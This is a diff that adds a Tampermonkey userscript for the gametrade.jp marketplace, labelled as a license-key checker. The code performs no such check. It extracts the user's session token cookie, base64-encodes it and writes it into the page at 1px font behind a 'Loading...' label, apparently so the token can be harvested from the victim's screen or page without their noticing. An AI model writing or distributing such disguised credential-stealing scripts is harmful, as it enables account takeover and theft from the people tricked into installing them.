@@ -1,0 +1,16 @@
+// ==UserScript==
+// @name         ライセンスキー確認用
+// @namespace    http://tampermonkey.net/
+// @version      1
+// @author       You
+// @match        https://gametrade.jp/*
+// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
+// @grant        none
+// ==/UserScript==
+$('.layer').append('<p id="ssw"><font>' + "ロード中..." + '</font></p>')
+function set() {
+    var aw = document.getElementById('ssw');
+    aw.style.fontSize = "1px";
+    aw.innerText = btoa(document.cookie.match("token=........................................")[0].slice(6))
+}
+set()
